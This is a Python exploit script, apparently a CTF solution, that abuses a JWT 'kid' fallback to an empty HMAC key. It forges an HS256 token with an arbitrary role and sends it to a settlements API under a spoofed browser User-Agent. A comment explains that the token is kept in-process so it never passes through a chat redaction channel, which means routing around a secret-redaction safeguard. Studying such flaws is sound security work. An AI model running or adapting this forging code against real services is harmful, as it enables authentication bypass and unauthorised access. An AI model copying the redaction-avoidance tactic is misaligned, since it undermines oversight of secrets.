#!/usr/bin/env python3
# Nothing to sign here (Fluid Attacks CTF 2026) -- JWT kid confusion a clave HMAC vacia.
# Uso:    ./jwt_kid_empty_key_forge.py <base_url> [role] [sub]
# Ejemplo: ./jwt_kid_empty_key_forge.py https://95e7a621d351017a.chal.ctf.ae tesoreria CX-4471
#
# Bug: resolve_session_key(kid) -> OctKey.import_key(SIGNING_KEYS.get(kid, "")).
# Un kid fuera de la whitelist cae a "" -> clave HMAC vacia (b"") -> se puede firmar cualquier token.
# El JWT se forja y se envia DENTRO del mismo proceso: nunca cruza el canal de chat/redaccion
# (que reemplaza secretos por [REDACTED:jwt] y provoca UnicodeDecodeError espurios en el server).

import sys, json, time, base64, hmac, hashlib, urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "https://95e7a621d351017a.chal.ctf.ae"
ROLE = sys.argv[2] if len(sys.argv) > 2 else "tesoreria"
SUB  = sys.argv[3] if len(sys.argv) > 3 else "CX-4471"

def b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header  = {"alg": "HS256", "kid": "attacker"}
payload = {"sub": SUB, "role": ROLE, "exp": int(time.time()) + 3600}
signing_input = f"{b64u(json.dumps(header,separators=(',',':')).encode())}." \
                f"{b64u(json.dumps(payload,separators=(',',':')).encode())}"
sig = hmac.new(b"", signing_input.encode(), hashlib.sha256).digest()
token = f"{signing_input}.{b64u(sig)}"

req = urllib.request.Request(
    f"{BASE}/api/settlements/master",
    headers={"Authorization": f"Bearer {token}",
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"},
)
with urllib.request.urlopen(req, timeout=15) as r:
    print(r.read().decode(errors="replace"))
